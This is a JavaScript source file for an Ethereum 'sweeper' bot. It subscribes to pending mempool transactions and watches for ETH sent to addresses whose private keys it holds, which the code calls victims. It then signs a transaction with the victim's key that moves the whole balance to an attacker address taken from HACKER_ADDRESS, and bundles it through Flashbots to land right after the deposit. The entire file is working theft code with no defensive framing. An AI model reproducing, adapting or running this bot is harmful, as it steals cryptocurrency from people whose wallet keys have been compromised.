import * as dotenv from 'dotenv';
dotenv.config({path : `./config/${process.env.NODE_ENV}/.env`});
import { accountArr, gasPriceMultiple, profitUWant, } from "./config.js";
import {  logSuccess, logInfo, logError} from "./src/logging.js";
import {  getWSSProvider } from "./src/constants.js";
import { getRawTransaction, sendBundleFlashbotsV2, } from "./src/relayer.js";
import { calcNextBlockBaseFee, isAddressMapping} from "./src/utils.js";
import { ethers } from "ethers";
export var victWallet;
const wssProvider = getWSSProvider();

const zeroDataRunTx = async (tx,txHash) => {
  const strLogPrefix = `txhash=${txHash}`;
  const victim = tx.to;
  const ethValue = tx.value;
  const gasLimit = tx.gasLimit;
  var block;
  var baseGasPricePerGas;
  var victETHBalance;
  var nonce;
  var backTxSigned;

  //check address is framwork-default-address or not
  var addressObj = isAddressMapping(victim,accountArr());

  if (addressObj == false) {
    return;
  }
  // return if amount of eth less than 21000 wei 
  if (ethValue.lt(ethers.BigNumber.from(21000))) {
    return;
  }

  // return if gas limit less than 21000 wei
  if (gasLimit.lt(ethers.BigNumber.from(21000))) {
    return;
  }

  try {
    block = await wssProvider.getBlock();
    baseGasPricePerGas = calcNextBlockBaseFee(block);
  } catch (e) {
    logError(
      "error when get block info",
      strLogPrefix,
      `error message =${e}`,
    );
    return;
  }

  logInfo(
    "找到攻擊目標",
    strLogPrefix
  ); 
  
  const targetBlockNumber = block.number + 1;
  
  victWallet = new ethers.Wallet(
    addressObj["key"],
    wssProvider
  );

  //eth transfer only need 21,000
  const gasUsed = ethers.BigNumber.from(21000);
  
  try {
    victETHBalance = await wssProvider.getBalance(victim);
    nonce = await wssProvider.getTransactionCount(victWallet.address);
  } catch (e) {
    logError(
      "error when get victim info",
      strLogPrefix,
      `error message =${e}`,
    );
    return;
  }
 
  const frontTxValue = tx.value;
  // You have to provide extra gas fee

  var totalGasPricePerGas;
  if( profitUWant() > 0)  {
    totalGasPricePerGas = victETHBalance.add(frontTxValue).sub(100).div(gasUsed)
  } else {
    totalGasPricePerGas = baseGasPricePerGas.mul(gasPriceMultiple());
  }
  
  const remainProfit =  victETHBalance.add(frontTxValue).sub(gasUsed.mul(totalGasPricePerGas))

  const backTx = {
    from: victWallet.address,
    to:process.env.HACKER_ADDRESS,
    value: remainProfit,
    nonce: nonce,
    gasLimit:21000,
    gasPrice: totalGasPricePerGas,
    chainId: parseInt(process.env.CHAIN_ID)
  }

  const victTx = getRawTransaction(tx);

  try {
    backTxSigned = await victWallet.signTransaction(backTx);   
  } catch (e) {
    logError(
      "error when victim sign tx",
      strLogPrefix,
      `error message =${e}`,
    );
    return;
  }

  const signedArray = [victTx,backTxSigned];

  var result;
  try {
    result = await sendBundleFlashbotsV2(
      wssProvider,
      victWallet,
      signedArray,
      targetBlockNumber
    );
  } catch (e) {
    logError(
      "error while sendBundleFlashbotsV2",
      strLogPrefix,
      `error message =${e}`,
      `block information =${block}`,
      `nonce =${nonce}`,
      `victTx =${victTx}`,
      `backTx =${backTx}`,
    );
    return;
  }

  logSuccess(
    "Success!",
    strLogPrefix
  ); 


  const receipt = result.bundleReceipt;
  const status = result.bundleStats;

  const value0 = receipt.bundleHash;
  const value1 = receipt.bundleTransactions[0].account;
  const value2 = receipt.bundleTransactions[0].hash;
  const value3 = receipt.bundleTransactions[1].account;
  const value4 = receipt.bundleTransactions[1].hash;
  const value5 = status.isHighPriority;
  const value6 = status.isSimulated;
  const value7 = status.simulatedAt;
  const value8 = status.submittedAt;
    
  logSuccess(
    "Bundle submitted!",
    strLogPrefix,
    `targetBlockNumber =${targetBlockNumber}`,
    `bundleHash =${value0}`,
    `tx1 account =${value1}`,
    `tx1 hash =${value2}`,
    `tx2 account =${value3}`,
    `tx2 hash =${value4}`,
    `isHighPriority =${value5}`,
    `isSimulated =${value6}`,
    `simulatedAt =${value7}`,
    `submittedAt =${value8}`
  ); 

};

const backRunTx = async (txHash) => {
  
  const [tx, txRecp] = await Promise.all([
    wssProvider.getTransaction(txHash),
    wssProvider.getTransactionReceipt(txHash),
  ]);

  // Make sure transaction hasn't been mined
  if (txRecp !== null) {
    return;
  }
  
  // Sometimes tx is null for some reason
  if (tx === null) {
    return;
  }

  // Transerfer eth
  if (tx.data == "0x"){
    zeroDataRunTx(tx,txHash).catch((e) => {})
    return;
  
  } else {
    // TODO 
    // noneZeroDataRunTx --> ERC20Token , NFT Balabala
    return; 
  }
};

const main = async () => {

  wssProvider.on("pending", (txHash) => {backRunTx(txHash).catch((e) => {})});

};

main();